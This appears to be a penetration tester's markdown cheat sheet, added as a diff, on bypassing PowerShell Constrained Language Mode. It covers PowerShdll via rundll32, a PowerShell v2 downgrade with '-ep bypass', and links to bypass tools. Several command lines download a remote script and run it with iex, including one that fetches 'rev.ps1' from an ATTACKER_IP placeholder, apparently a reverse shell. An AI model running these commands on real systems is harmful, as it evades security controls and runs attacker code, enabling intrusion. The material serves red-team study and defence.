@@ -1,0 +1,51 @@
+#  Bypassing Contrained Powershell
+
+#### Check Versioning - [[Powershell-versions]]
+
+#### Default powershell locations in a Windows system.
+
+```
+C:\windows\syswow64\windowspowershell\v1.0\powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+```
+
+#### Powershell Constrained Mode
+
+Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`
+
+#### bypass-clm - PowerShell Constrained Language Mode Bypass
+[bypass-clm - PowerShell Constrained Language Mode Bypass](https://github.com/calebstewart/bypass-clm)
+
+
+#### PowerShdll - Powershell with no Powershell.exe via DLL
+[PowerShdll - Powershell with no Powershell.exe via DLL's](https://github.com/p3nt4/PowerShdll) Run PowerShell with rundll32. Bypass software restrictions. Run PowerShell with dlls only and does not require access to powershell.exe as it uses powershell automation dlls. PowerShdll can be run with: rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe or as a standalone executable.
+
+Requires:
+-   .Net v3.5 for dll mode.
+-   .Net v2.0 for exe mode.
+
+```powershell
+Usage:
+rundll32 PowerShdll,main <script>
+rundll32 PowerShdll,main -h      Display this message
+rundll32 PowerShdll,main -f <path>       Run the script passed as argument
+rundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)
+rundll32 PowerShdll,main -i      Start an interactive console in this console
+# If you do not have an interractive console, use -n to avoid crashes on output
+
+# Run base64 encodeed script
+rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
+# download and run script
+rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
+```
+
+#### Other bypasses
+
+```powershell
+PS > &{ whoami }
+powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+```
+
+## References
+
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.mdl)
